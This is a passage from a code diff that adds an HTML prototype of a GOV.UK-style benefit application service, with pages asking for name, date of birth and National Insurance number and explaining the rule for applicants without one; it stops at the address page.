@@ -1,0 +1,510 @@
+
+<style>
+  * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Noto Sans', sans-serif; }
+  .page { display: none; }
+  .page.active { display: block; }
+  .govuk-header { background: #0b0c0c; padding: 10px 0; border-bottom: 10px solid #1d70b8; }
+  .govuk-header__inner { max-width: 960px; margin: 0 auto; padding: 0 15px; display: flex; align-items: center; }
+  .govuk-header__logotype-text { color: white; font-size: 30px; font-weight: 700; letter-spacing: -1px; margin-left: 10px; }
+  .govuk-crown { width: 36px; height: 28px; fill: white; }
+  .govuk-phase-banner { background: #f3f2f1; border-bottom: 1px solid #b1b4b6; padding: 6px 0; }
+  .govuk-phase-banner__inner { max-width: 960px; margin: 0 auto; padding: 0 15px; display: flex; align-items: center; gap: 10px; font-size: 14px; }
+  .govuk-tag { background: #1d70b8; color: white; font-weight: 700; font-size: 14px; padding: 2px 8px; text-transform: uppercase; letter-spacing: 1px; }
+  .govuk-main { max-width: 960px; margin: 0 auto; padding: 30px 15px 60px; }
+  .govuk-main-narrow { max-width: 640px; margin: 0 auto; padding: 30px 15px 60px; }
+  .govuk-start-grid { display: grid; grid-template-columns: 2fr 1fr; gap: 40px; }
+  .govuk-back { display: inline-block; font-size: 14px; color: #0b0c0c; margin-bottom: 24px; text-decoration: none; cursor: pointer; }
+  .govuk-back:hover { text-decoration: underline; }
+  .govuk-caption { font-size: 18px; color: #505a5f; margin-bottom: 6px; }
+  .govuk-h1 { font-size: 36px; font-weight: 700; color: #0b0c0c; margin-bottom: 24px; line-height: 1.1; }
+  .govuk-h2 { font-size: 24px; font-weight: 700; color: #0b0c0c; margin-bottom: 16px; }
+  .govuk-h3 { font-size: 20px; font-weight: 700; color: #0b0c0c; margin-bottom: 12px; }
+  .govuk-lede { font-size: 20px; color: #0b0c0c; margin-bottom: 20px; line-height: 1.5; }
+  .govuk-body { font-size: 17px; color: #0b0c0c; line-height: 1.6; margin-bottom: 16px; }
+  .govuk-body-s { font-size: 15px; color: #505a5f; line-height: 1.6; margin-bottom: 12px; }
+  .govuk-list { font-size: 17px; color: #0b0c0c; padding-left: 20px; margin-bottom: 20px; line-height: 1.6; }
+  .govuk-list li { margin-bottom: 8px; }
+  .govuk-section-break { border: 0; border-top: 1px solid #b1b4b6; margin: 24px 0; }
+  .govuk-label { display: block; font-size: 19px; font-weight: 700; color: #0b0c0c; margin-bottom: 6px; }
+  .govuk-label-hint { display: block; font-size: 16px; color: #505a5f; margin-bottom: 8px; font-weight: 400; }
+  .govuk-input { display: block; width: 100%; max-width: 400px; padding: 8px; font-size: 19px; border: 2px solid #0b0c0c; border-radius: 0; outline: none; margin-bottom: 24px; }
+  .govuk-input:focus { outline: 3px solid #ffdd00; outline-offset: 0; box-shadow: inset 0 0 0 2px #0b0c0c; }
+  .govuk-input-small { max-width: 120px; }
+  .govuk-date-group { display: flex; gap: 16px; align-items: flex-end; margin-bottom: 24px; }
+  .govuk-date-field { display: flex; flex-direction: column; }
+  .govuk-date-field label { font-size: 16px; font-weight: 700; color: #0b0c0c; margin-bottom: 4px; }
+  .govuk-date-field input { width: 70px; padding: 8px; font-size: 19px; border: 2px solid #0b0c0c; border-radius: 0; outline: none; }
+  .govuk-date-field input.wide { width: 100px; }
+  .govuk-date-field input:focus { outline: 3px solid #ffdd00; outline-offset: 0; box-shadow: inset 0 0 0 2px #0b0c0c; }
+  .govuk-button { display: inline-block; background: #00703c; color: white; font-size: 19px; font-weight: 700; padding: 10px 22px; border: none; box-shadow: 0 2px 0 #002d18; cursor: pointer; margin-top: 8px; text-decoration: none; }
+  .govuk-button:hover { background: #005a30; color: white; }
+  .govuk-button-secondary { background: #f3f2f1; color: #0b0c0c; box-shadow: 0 2px 0 #929191; margin-left: 16px; }
+  .govuk-button-secondary:hover { background: #dbdad9; color: #0b0c0c; }
+  .govuk-button-container { margin: 28px 0; display: flex; align-items: center; flex-wrap: wrap; gap: 8px; }
+  .govuk-warning { border-left: 6px solid #0b0c0c; padding: 12px 16px; margin: 20px 0; display: flex; align-items: flex-start; gap: 12px; }
+  .govuk-warning__icon { font-size: 28px; font-weight: 700; color: #0b0c0c; flex-shrink: 0; line-height: 1; }
+  .govuk-warning__text { font-size: 17px; font-weight: 700; color: #0b0c0c; }
+  .govuk-inset { border-left: 6px solid #b1b4b6; padding: 16px; margin: 24px 0; background: #f3f2f1; font-size: 17px; color: #0b0c0c; line-height: 1.6; }
+  .govuk-inset p { margin-bottom: 8px; }
+  .govuk-inset p:last-child { margin-bottom: 0; }
+  .govuk-related { border-top: 4px solid #0b0c0c; padding-top: 16px; }
+  .govuk-related h2 { font-size: 19px; font-weight: 700; margin-bottom: 12px; color: #0b0c0c; }
+  .govuk-related ul { list-style: none; padding: 0; }
+  .govuk-related ul li { border-bottom: 1px solid #b1b4b6; padding: 10px 0; font-size: 16px; }
+  .govuk-related ul li a { color: #1d70b8; }
+  .govuk-error { color: #d4351c; font-size: 16px; font-weight: 700; margin-bottom: 8px; display: none; border-left: 4px solid #d4351c; padding-left: 12px; }
+  .govuk-error.visible { display: block; }
+  .govuk-error-border { border-color: #d4351c !important; }
+  .govuk-summary-list { border-top: 1px solid #b1b4b6; margin-bottom: 30px; }
+  .govuk-summary-row { display: grid; grid-template-columns: 1fr 1fr 1fr; border-bottom: 1px solid #b1b4b6; padding: 12px 0; gap: 16px; }
+  .govuk-summary-key { font-size: 17px; font-weight: 700; color: #0b0c0c; }
+  .govuk-summary-value { font-size: 17px; color: #0b0c0c; }
+  .govuk-summary-action a { font-size: 17px; color: #1d70b8; text-decoration: underline; cursor: pointer; }
+  .govuk-fieldset-hint { font-size: 16px; color: #505a5f; margin-bottom: 16px; }
+  .govuk-footer { background: #f3f2f1; border-top: 1px solid #b1b4b6; padding: 25px 0; margin-top: 40px; }
+  .govuk-footer__inner { max-width: 960px; margin: 0 auto; padding: 0 15px; font-size: 14px; color: #505a5f; }
+  .govuk-radio { display: flex; align-items: flex-start; gap: 12px; margin-bottom: 16px; cursor: pointer; }
+  .govuk-radio input { width: 40px; height: 40px; margin-top: 0; flex-shrink: 0; cursor: pointer; accent-color: #0b0c0c; }
+  .govuk-radio label { font-size: 19px; color: #0b0c0c; cursor: pointer; padding-top: 8px; }
+  .govuk-radio-divider { font-size: 17px; color: #505a5f; margin: 8px 0 16px 52px; }
+  .govuk-checkbox { display: flex; align-items: flex-start; gap: 12px; margin-bottom: 16px; cursor: pointer; }
+  .govuk-checkbox input { width: 40px; height: 40px; margin-top: 0; flex-shrink: 0; cursor: pointer; accent-color: #0b0c0c; }
+  .govuk-checkbox label { font-size: 19px; color: #0b0c0c; cursor: pointer; padding-top: 8px; line-height: 1.4; }
+  .govuk-ni-boxes { display: flex; align-items: center; gap: 8px; margin-bottom: 8px; flex-wrap: wrap; }
+  .govuk-ni-box { width: 64px; padding: 8px 4px; font-size: 22px; font-weight: 700; border: 2px solid #0b0c0c; border-radius: 0; outline: none; text-align: center; text-transform: uppercase; letter-spacing: 2px; color: #0b0c0c; }
+  .govuk-ni-box:focus { outline: 3px solid #ffdd00; outline-offset: 0; box-shadow: inset 0 0 0 2px #0b0c0c; }
+  .govuk-ni-box.wide { width: 80px; }
+  .govuk-ni-separator { font-size: 24px; color: #505a5f; font-weight: 700; padding: 0 2px; }
+  .govuk-panel { background: #00703c; padding: 30px; margin-bottom: 30px; }
+  .govuk-panel__title { font-size: 36px; font-weight: 700; color: white; margin-bottom: 12px; }
+  .govuk-panel__body { font-size: 24px; color: white; }
+  .govuk-link { color: #1d70b8; }
+  .govuk-link:hover { color: #003078; }
+  .govuk-important-box { background: #fff7e6; border-left: 6px solid #f47738; padding: 16px; margin: 24px 0; }
+  .govuk-important-box p { font-size: 17px; color: #0b0c0c; margin-bottom: 8px; line-height: 1.6; }
+  .govuk-important-box p:last-child { margin-bottom: 0; }
+  .ni-no-link { font-size: 17px; color: #1d70b8; cursor: pointer; text-decoration: underline; display: inline-block; margin-top: 8px; }
+  .ni-no-link:hover { color: #003078; }
+  @media (max-width: 640px) { .govuk-start-grid { grid-template-columns: 1fr; } .govuk-h1 { font-size: 26px; } .govuk-ni-boxes { gap: 4px; } .govuk-ni-box { width: 52px; font-size: 18px; } }
+</style>
+
+<!-- PAGE 0: Start -->
+<div class="page active" id="page-start">
+  <header class="govuk-header"><div class="govuk-header__inner"><svg class="govuk-crown" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 132 97" aria-hidden="true"><path d="M25 30.2c3.5 1.5 7.7-.2 9.1-3.7 1.5-3.6-.2-7.8-3.9-9.2-3.6-1.4-7.6.3-9.1 3.9-1.4 3.5.3 7.5 3.9 9zm51.1-3c1.5 3.5 5.7 5.2 9.1 3.8 3.6-1.4 5.3-5.4 3.8-9-1.4-3.5-5.3-5.2-8.9-3.8-3.6 1.3-5.3 5.3-4 9zM66.1 62.5H33.3L19.8 39.4c-5.4 2.2-11.5-.6-12.6-6.3-1-5.6 3.3-11 9-11.4 5.7-.4 10.7 4.2 10.7 9.9 0 .9-.1 1.7-.3 2.5L45.1 55.4c3.4-2.2 7.8-2.2 11.2 0l18.5-21.3c-.2-.8-.3-1.6-.3-2.5 0-5.7 5-10.3 10.7-9.9 5.7.4 10 5.8 9 11.4-1.1 5.7-7.2 8.5-12.6 6.3L67.9 55.4h.3l-.3-.4.2.3v.3L56.3 73.2H33.9L22.8 55.8H11.6l.1 3h11.2L33.3 75.7h22.9l11.5-18.9.3-.2.1-.1z"/></svg><span class="govuk-header__logotype-text">GOV.UK</span></div></header>
+  <div class="govuk-phase-banner"><div class="govuk-phase-banner__inner"><span class="govuk-tag">Beta</span><span>This is a new service – your <a href="#">feedback</a> will help us improve it.</span></div></div>
+  <main class="govuk-main">
+    <div class="govuk-start-grid">
+      <div>
+        <p class="govuk-caption">Benefits &amp; financial support</p>
+        <h1 class="govuk-h1">Apply for Health and Disability Benefit (HDB)</h1>
+        <p class="govuk-lede">Get financial support if you have a long-term health condition or disability that affects your daily life or ability to work.</p>
+        <p class="govuk-body">Use this service to:</p>
+        <ul class="govuk-list"><li>check if you're eligible for Health and Disability Benefit</li><li>find out how much you could receive</li><li>submit a new claim or update an existing one</li></ul>
+        <hr class="govuk-section-break">
+        <h2 class="govuk-h2">Before you start</h2>
+        <p class="govuk-body">You'll need:</p>
+        <ul class="govuk-list"><li>your National Insurance number (if you have one)</li><li>details of your health condition or disability</li><li>information about any healthcare professionals treating you</li><li>your bank account details (for payment)</li></ul>
+        <div class="govuk-warning"><span class="govuk-warning__icon" aria-hidden="true">!</span><span class="govuk-warning__text">Applying takes around 30 minutes. You cannot save your progress and return later.</span></div>
+        <div class="govuk-button-container"><a class="govuk-button" onclick="goTo('page-name'); return false;" href="#">Start now</a></div>
+        <div class="govuk-inset"><p>If you need help applying, call the HDB helpline on <strong>0800 328 5644</strong> (free from a landline or mobile). Lines are open Monday to Friday, 8am to 6pm.</p></div>
+        <hr class="govuk-section-break">
+        <p class="govuk-body">By using this service you agree to the <a href="#">terms of use</a> and our <a href="#">privacy policy</a>.</p>
+      </div>
+      <aside><div class="govuk-related"><h2>Related content</h2><ul><li><a href="#">Check your eligibility</a></li><li><a href="#">HDB rates and payments</a></li><li><a href="#">What happens after you apply</a></li><li><a href="#">Appeal a decision</a></li><li><a href="#">Other disability benefits</a></li></ul></div></aside>
+    </div>
+  </main>
+  <footer class="govuk-footer"><div class="govuk-footer__inner"><p>Built by the Department for Work &amp; Pensions &nbsp;·&nbsp; <a href="#">Accessibility statement</a> &nbsp;·&nbsp; <a href="#">Cookies</a></p></div></footer>
+</div>
+
+<!-- PAGE 1: Name -->
+<div class="page" id="page-name">
+  <header class="govuk-header"><div class="govuk-header__inner"><svg class="govuk-crown" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 132 97" aria-hidden="true"><path d="M25 30.2c3.5 1.5 7.7-.2 9.1-3.7 1.5-3.6-.2-7.8-3.9-9.2-3.6-1.4-7.6.3-9.1 3.9-1.4 3.5.3 7.5 3.9 9zm51.1-3c1.5 3.5 5.7 5.2 9.1 3.8 3.6-1.4 5.3-5.4 3.8-9-1.4-3.5-5.3-5.2-8.9-3.8-3.6 1.3-5.3 5.3-4 9zM66.1 62.5H33.3L19.8 39.4c-5.4 2.2-11.5-.6-12.6-6.3-1-5.6 3.3-11 9-11.4 5.7-.4 10.7 4.2 10.7 9.9 0 .9-.1 1.7-.3 2.5L45.1 55.4c3.4-2.2 7.8-2.2 11.2 0l18.5-21.3c-.2-.8-.3-1.6-.3-2.5 0-5.7 5-10.3 10.7-9.9 5.7.4 10 5.8 9 11.4-1.1 5.7-7.2 8.5-12.6 6.3L67.9 55.4h.3l-.3-.4.2.3v.3L56.3 73.2H33.9L22.8 55.8H11.6l.1 3h11.2L33.3 75.7h22.9l11.5-18.9.3-.2.1-.1z"/></svg><span class="govuk-header__logotype-text">GOV.UK</span></div></header>
+  <div class="govuk-phase-banner"><div class="govuk-phase-banner__inner"><span class="govuk-tag">Beta</span><span>This is a new service – your <a href="#">feedback</a> will help us improve it.</span></div></div>
+  <main class="govuk-main-narrow">
+    <a class="govuk-back" onclick="goTo('page-start')">← Back</a>
+    <p class="govuk-caption">Apply for Health and Disability Benefit</p>
+    <h1 class="govuk-h1">What is your name?</h1>
+    <p class="govuk-fieldset-hint">Enter your name as it appears on your National Insurance card or official documents.</p>
+    <label class="govuk-label" for="firstname">First name</label>
+    <span class="govuk-error" id="err-firstname">Enter your first name</span>
+    <input class="govuk-input" type="text" id="firstname" autocomplete="given-name">
+    <label class="govuk-label" for="surname">Last name</label>
+    <span class="govuk-error" id="err-surname">Enter your last name</span>
+    <input class="govuk-input" type="text" id="surname" autocomplete="family-name">
+    <button class="govuk-button" onclick="submitName()">Continue</button>
+  </main>
+  <footer class="govuk-footer"><div class="govuk-footer__inner"><p>Built by the Department for Work &amp; Pensions</p></div></footer>
+</div>
+
+<!-- PAGE 2: DOB -->
+<div class="page" id="page-dob">
+  <header class="govuk-header"><div class="govuk-header__inner"><svg class="govuk-crown" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 132 97" aria-hidden="true"><path d="M25 30.2c3.5 1.5 7.7-.2 9.1-3.7 1.5-3.6-.2-7.8-3.9-9.2-3.6-1.4-7.6.3-9.1 3.9-1.4 3.5.3 7.5 3.9 9zm51.1-3c1.5 3.5 5.7 5.2 9.1 3.8 3.6-1.4 5.3-5.4 3.8-9-1.4-3.5-5.3-5.2-8.9-3.8-3.6 1.3-5.3 5.3-4 9zM66.1 62.5H33.3L19.8 39.4c-5.4 2.2-11.5-.6-12.6-6.3-1-5.6 3.3-11 9-11.4 5.7-.4 10.7 4.2 10.7 9.9 0 .9-.1 1.7-.3 2.5L45.1 55.4c3.4-2.2 7.8-2.2 11.2 0l18.5-21.3c-.2-.8-.3-1.6-.3-2.5 0-5.7 5-10.3 10.7-9.9 5.7.4 10 5.8 9 11.4-1.1 5.7-7.2 8.5-12.6 6.3L67.9 55.4h.3l-.3-.4.2.3v.3L56.3 73.2H33.9L22.8 55.8H11.6l.1 3h11.2L33.3 75.7h22.9l11.5-18.9.3-.2.1-.1z"/></svg><span class="govuk-header__logotype-text">GOV.UK</span></div></header>
+  <div class="govuk-phase-banner"><div class="govuk-phase-banner__inner"><span class="govuk-tag">Beta</span><span>This is a new service – your <a href="#">feedback</a> will help us improve it.</span></div></div>
+  <main class="govuk-main-narrow">
+    <a class="govuk-back" onclick="goTo('page-name')">← Back</a>
+    <p class="govuk-caption">Apply for Health and Disability Benefit</p>
+    <h1 class="govuk-h1">What is your date of birth?</h1>
+    <p class="govuk-fieldset-hint">For example, 15 3 1984</p>
+    <span class="govuk-error" id="err-dob">Enter a valid date of birth</span>
+    <div class="govuk-date-group">
+      <div class="govuk-date-field"><label for="dob-day">Day</label><input type="text" id="dob-day" inputmode="numeric" maxlength="2" placeholder="DD"></div>
+      <div class="govuk-date-field"><label for="dob-month">Month</label><input type="text" id="dob-month" inputmode="numeric" maxlength="2" placeholder="MM"></div>
+      <div class="govuk-date-field"><label for="dob-year">Year</label><input type="text" id="dob-year" inputmode="numeric" maxlength="4" placeholder="YYYY" class="wide"></div>
+    </div>
+    <button class="govuk-button" onclick="submitDob()">Continue</button>
+  </main>
+  <footer class="govuk-footer"><div class="govuk-footer__inner"><p>Built by the Department for Work &amp; Pensions</p></div></footer>
+</div>
+
+<!-- PAGE 3: NI Number -->
+<div class="page" id="page-ni">
+  <header class="govuk-header"><div class="govuk-header__inner"><svg class="govuk-crown" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 132 97" aria-hidden="true"><path d="M25 30.2c3.5 1.5 7.7-.2 9.1-3.7 1.5-3.6-.2-7.8-3.9-9.2-3.6-1.4-7.6.3-9.1 3.9-1.4 3.5.3 7.5 3.9 9zm51.1-3c1.5 3.5 5.7 5.2 9.1 3.8 3.6-1.4 5.3-5.4 3.8-9-1.4-3.5-5.3-5.2-8.9-3.8-3.6 1.3-5.3 5.3-4 9zM66.1 62.5H33.3L19.8 39.4c-5.4 2.2-11.5-.6-12.6-6.3-1-5.6 3.3-11 9-11.4 5.7-.4 10.7 4.2 10.7 9.9 0 .9-.1 1.7-.3 2.5L45.1 55.4c3.4-2.2 7.8-2.2 11.2 0l18.5-21.3c-.2-.8-.3-1.6-.3-2.5 0-5.7 5-10.3 10.7-9.9 5.7.4 10 5.8 9 11.4-1.1 5.7-7.2 8.5-12.6 6.3L67.9 55.4h.3l-.3-.4.2.3v.3L56.3 73.2H33.9L22.8 55.8H11.6l.1 3h11.2L33.3 75.7h22.9l11.5-18.9.3-.2.1-.1z"/></svg><span class="govuk-header__logotype-text">GOV.UK</span></div></header>
+  <div class="govuk-phase-banner"><div class="govuk-phase-banner__inner"><span class="govuk-tag">Beta</span><span>This is a new service – your <a href="#">feedback</a> will help us improve it.</span></div></div>
+  <main class="govuk-main-narrow">
+    <a class="govuk-back" onclick="goTo('page-dob')">← Back</a>
+    <p class="govuk-caption">Apply for Health and Disability Benefit</p>
+    <h1 class="govuk-h1">What is your National Insurance number?</h1>
+    <p class="govuk-body">Your National Insurance number keeps a record of the contributions you have paid. It looks like this: <strong>QQ 12 34 56 C</strong></p>
+    <div class="govuk-inset">
+      <p><strong>Where to find your National Insurance number:</strong></p>
+      <ul class="govuk-list" style="margin-bottom:0">
+        <li>on your payslip or P60</li>
+        <li>on letters from DWP or HMRC</li>
+        <li>in the HMRC app or your Personal Tax Account at gov.uk</li>
+        <li>on your National Insurance card (if you have one)</li>
+      </ul>
+    </div>
+    <label class="govuk-label" for="ni-1">Enter your National Insurance number</label>
+    <span class="govuk-label-hint">Enter the letters and numbers in the boxes below</span>
+    <span class="govuk-error" id="err-ni">Enter a valid National Insurance number</span>
+    <div class="govuk-ni-boxes">
+      <input class="govuk-ni-box" type="text" id="ni-1" maxlength="2" placeholder="QQ" aria-label="First two letters">
+      <span class="govuk-ni-separator">—</span>
+      <input class="govuk-ni-box" type="text" id="ni-2" maxlength="2" placeholder="12" aria-label="First pair of numbers">
+      <span class="govuk-ni-separator">—</span>
+      <input class="govuk-ni-box" type="text" id="ni-3" maxlength="2" placeholder="34" aria-label="Second pair of numbers">
+      <span class="govuk-ni-separator">—</span>
+      <input class="govuk-ni-box" type="text" id="ni-4" maxlength="2" placeholder="56" aria-label="Third pair of numbers">
+      <span class="govuk-ni-separator">—</span>
+      <input class="govuk-ni-box" type="text" id="ni-5" maxlength="1" placeholder="C" aria-label="Final letter">
+    </div>
+    <span class="ni-no-link" onclick="goTo('page-ni-sixmonth')">I do not have a National Insurance number</span>
+    <br><br>
+    <button class="govuk-button" onclick="submitNI()">Continue</button>
+  </main>
+  <footer class="govuk-footer"><div class="govuk-footer__inner"><p>Built by the Department for Work &amp; Pensions</p></div></footer>
+</div>
+
+<!-- PAGE 3A: No NI — 6 month rule explanation -->
+<div class="page" id="page-ni-sixmonth">
+  <header class="govuk-header"><div class="govuk-header__inner"><svg class="govuk-crown" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 132 97" aria-hidden="true"><path d="M25 30.2c3.5 1.5 7.7-.2 9.1-3.7 1.5-3.6-.2-7.8-3.9-9.2-3.6-1.4-7.6.3-9.1 3.9-1.4 3.5.3 7.5 3.9 9zm51.1-3c1.5 3.5 5.7 5.2 9.1 3.8 3.6-1.4 5.3-5.4 3.8-9-1.4-3.5-5.3-5.2-8.9-3.8-3.6 1.3-5.3 5.3-4 9zM66.1 62.5H33.3L19.8 39.4c-5.4 2.2-11.5-.6-12.6-6.3-1-5.6 3.3-11 9-11.4 5.7-.4 10.7 4.2 10.7 9.9 0 .9-.1 1.7-.3 2.5L45.1 55.4c3.4-2.2 7.8-2.2 11.2 0l18.5-21.3c-.2-.8-.3-1.6-.3-2.5 0-5.7 5-10.3 10.7-9.9 5.7.4 10 5.8 9 11.4-1.1 5.7-7.2 8.5-12.6 6.3L67.9 55.4h.3l-.3-.4.2.3v.3L56.3 73.2H33.9L22.8 55.8H11.6l.1 3h11.2L33.3 75.7h22.9l11.5-18.9.3-.2.1-.1z"/></svg><span class="govuk-header__logotype-text">GOV.UK</span></div></header>
+  <div class="govuk-phase-banner"><div class="govuk-phase-banner__inner"><span class="govuk-tag">Beta</span><span>This is a new service – your <a href="#">feedback</a> will help us improve it.</span></div></div>
+  <main class="govuk-main-narrow">
+    <a class="govuk-back" onclick="goTo('page-ni')">← Back</a>
+    <p class="govuk-caption">Apply for Health and Disability Benefit</p>
+    <h1 class="govuk-h1">You can still apply without a National Insurance number</h1>
+    <p class="govuk-body">Not having a National Insurance number will not stop you from applying for Health and Disability Benefit.</p>
+    <p class="govuk-body">However, if your application is successful, you will need to get a National Insurance number within <strong>6 months</strong> of your award date.</p>
+    <div class="govuk-important-box">
+      <p><strong>Important:</strong> If you do not get a National Insurance number within 6 months of a successful decision, your benefit will be reviewed and may stop.</p>
+      <p>This only applies if your application is successful. You do not need to do anything now.</p>
+    </div>
+    <p class="govuk-body">On the next page we will ask if you would like to apply for a National Insurance number as part of this application. This can make the process easier.</p>
+    <button class="govuk-button" onclick="goTo('page-ni-apply')">Continue</button>
+  </main>
+  <footer class="govuk-footer"><div class="govuk-footer__inner"><p>Built by the Department for Work &amp; Pensions</p></div></footer>
+</div>
+
+<!-- PAGE 3B: No NI — do you want to apply for one? -->
+<div class="page" id="page-ni-apply">
+  <header class="govuk-header"><div class="govuk-header__inner"><svg class="govuk-crown" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 132 97" aria-hidden="true"><path d="M25 30.2c3.5 1.5 7.7-.2 9.1-3.7 1.5-3.6-.2-7.8-3.9-9.2-3.6-1.4-7.6.3-9.1 3.9-1.4 3.5.3 7.5 3.9 9zm51.1-3c1.5 3.5 5.7 5.2 9.1 3.8 3.6-1.4 5.3-5.4 3.8-9-1.4-3.5-5.3-5.2-8.9-3.8-3.6 1.3-5.3 5.3-4 9zM66.1 62.5H33.3L19.8 39.4c-5.4 2.2-11.5-.6-12.6-6.3-1-5.6 3.3-11 9-11.4 5.7-.4 10.7 4.2 10.7 9.9 0 .9-.1 1.7-.3 2.5L45.1 55.4c3.4-2.2 7.8-2.2 11.2 0l18.5-21.3c-.2-.8-.3-1.6-.3-2.5 0-5.7 5-10.3 10.7-9.9 5.7.4 10 5.8 9 11.4-1.1 5.7-7.2 8.5-12.6 6.3L67.9 55.4h.3l-.3-.4.2.3v.3L56.3 73.2H33.9L22.8 55.8H11.6l.1 3h11.2L33.3 75.7h22.9l11.5-18.9.3-.2.1-.1z"/></svg><span class="govuk-header__logotype-text">GOV.UK</span></div></header>
+  <div class="govuk-phase-banner"><div class="govuk-phase-banner__inner"><span class="govuk-tag">Beta</span><span>This is a new service – your <a href="#">feedback</a> will help us improve it.</span></div></div>
+  <main class="govuk-main-narrow">
+    <a class="govuk-back" onclick="goTo('page-ni-sixmonth')">← Back</a>
+    <p class="govuk-caption">Apply for Health and Disability Benefit</p>
+    <h1 class="govuk-h1">Would you like to apply for a National Insurance number as part of this application?</h1>
+    <p class="govuk-body">Applying for a National Insurance number at the same time as your benefit means you only need to provide your details once. It can also speed up the process if your application is successful.</p>
+    <span class="govuk-error" id="err-ni-apply">Select yes or no</span>
+    <div class="govuk-radio"><input type="radio" name="ni-apply" id="ni-apply-yes" value="yes"><label for="ni-apply-yes">Yes, apply for a National Insurance number as part of this application</label></div>
+    <div class="govuk-radio"><input type="radio" name="ni-apply" id="ni-apply-no" value="no"><label for="ni-apply-no">No, I will get a National Insurance number separately</label></div>
+    <button class="govuk-button" onclick="submitNIApply()">Continue</button>
+  </main>
+  <footer class="govuk-footer"><div class="govuk-footer__inner"><p>Built by the Department for Work &amp; Pensions</p></div></footer>
+</div>
+
+<!-- PAGE 3C: NI application placeholder -->
+<div class="page" id="page-ni-placeholder">
+  <header class="govuk-header"><div class="govuk-header__inner"><svg class="govuk-crown" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 132 97" aria-hidden="true"><path d="M25 30.2c3.5 1.5 7.7-.2 9.1-3.7 1.5-3.6-.2-7.8-3.9-9.2-3.6-1.4-7.6.3-9.1 3.9-1.4 3.5.3 7.5 3.9 9zm51.1-3c1.5 3.5 5.7 5.2 9.1 3.8 3.6-1.4 5.3-5.4 3.8-9-1.4-3.5-5.3-5.2-8.9-3.8-3.6 1.3-5.3 5.3-4 9zM66.1 62.5H33.3L19.8 39.4c-5.4 2.2-11.5-.6-12.6-6.3-1-5.6 3.3-11 9-11.4 5.7-.4 10.7 4.2 10.7 9.9 0 .9-.1 1.7-.3 2.5L45.1 55.4c3.4-2.2 7.8-2.2 11.2 0l18.5-21.3c-.2-.8-.3-1.6-.3-2.5 0-5.7 5-10.3 10.7-9.9 5.7.4 10 5.8 9 11.4-1.1 5.7-7.2 8.5-12.6 6.3L67.9 55.4h.3l-.3-.4.2.3v.3L56.3 73.2H33.9L22.8 55.8H11.6l.1 3h11.2L33.3 75.7h22.9l11.5-18.9.3-.2.1-.1z"/></svg><span class="govuk-header__logotype-text">GOV.UK</span></div></header>
+  <div class="govuk-phase-banner"><div class="govuk-phase-banner__inner"><span class="govuk-tag">Beta</span><span>This is a new service – your <a href="#">feedback</a> will help us improve it.</span></div></div>
+  <main class="govuk-main-narrow">
+    <a class="govuk-back" onclick="goTo('page-ni-apply')">← Back</a>
+    <p class="govuk-caption">Apply for a National Insurance number</p>
+    <h1 class="govuk-h1">National Insurance number application</h1>
+    <div class="govuk-inset">
+      <p><strong>This is a placeholder for the National Insurance number application journey.</strong></p>
+      <p>In the full service, this section would collect the information needed to apply for a National Insurance number, including identity documents, right to work status and contact details.</p>
+      <p>For the purposes of this prototype, click Continue to proceed with your HDB application.</p>
+    </div>
+    <button class="govuk-button" onclick="data.niStatus = 'application-in-progress'; goTo('page-address');">Continue</button>
+  </main>
+  <footer class="govuk-footer"><div class="govuk-footer__inner"><p>Built by the Department for Work &amp; Pensions</p></div></footer>
+</div>
+
+<!-- PAGE 3D: No NI — confirm understanding -->
+<div class="page" id="page-ni-confirm">
+  <header class="govuk-header"><div class="govuk-header__inner"><svg class="govuk-crown" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 132 97" aria-hidden="true"><path d="M25 30.2c3.5 1.5 7.7-.2 9.1-3.7 1.5-3.6-.2-7.8-3.9-9.2-3.6-1.4-7.6.3-9.1 3.9-1.4 3.5.3 7.5 3.9 9zm51.1-3c1.5 3.5 5.7 5.2 9.1 3.8 3.6-1.4 5.3-5.4 3.8-9-1.4-3.5-5.3-5.2-8.9-3.8-3.6 1.3-5.3 5.3-4 9zM66.1 62.5H33.3L19.8 39.4c-5.4 2.2-11.5-.6-12.6-6.3-1-5.6 3.3-11 9-11.4 5.7-.4 10.7 4.2 10.7 9.9 0 .9-.1 1.7-.3 2.5L45.1 55.4c3.4-2.2 7.8-2.2 11.2 0l18.5-21.3c-.2-.8-.3-1.6-.3-2.5 0-5.7 5-10.3 10.7-9.9 5.7.4 10 5.8 9 11.4-1.1 5.7-7.2 8.5-12.6 6.3L67.9 55.4h.3l-.3-.4.2.3v.3L56.3 73.2H33.9L22.8 55.8H11.6l.1 3h11.2L33.3 75.7h22.9l11.5-18.9.3-.2.1-.1z"/></svg><span class="govuk-header__logotype-text">GOV.UK</span></div></header>
+  <div class="govuk-phase-banner"><div class="govuk-phase-banner__inner"><span class="govuk-tag">Beta</span><span>This is a new service – your <a href="#">feedback</a> will help us improve it.</span></div></div>
+  <main class="govuk-main-narrow">
+    <a class="govuk-back" onclick="goTo('page-ni-apply')">← Back</a>
+    <p class="govuk-caption">Apply for Health and Disability Benefit</p>
+    <h1 class="govuk-h1">Confirm you understand the National Insurance number requirement</h1>
+    <p class="govuk-body">Before you continue, please confirm that you understand the following:</p>
+    <div class="govuk-important-box">
+      <p>If your application is successful, you must get a National Insurance number within <strong>6 months</strong> of your award date.</p>
+      <p>If you do not do this, your benefit will be reviewed and may stop.</p>
+    </div>
+    <span class="govuk-error" id="err-ni-confirm">You must confirm you understand before continuing</span>
+    <div class="govuk-checkbox">
+      <input type="checkbox" id="ni-understand">
+      <label for="ni-understand">I understand that I need to get a National Insurance number within 6 months of a successful decision, or my benefit may stop</label>
+    </div>
+    <button class="govuk-button" onclick="submitNIConfirm()">Continue</button>
+  </main>
+  <footer class="govuk-footer"><div class="govuk-footer__inner"><p>Built by the Department for Work &amp; Pensions</p></div></footer>
+</div>
+
+<!-- PAGE 4: Address -->
+<div class="page" id="page-address">
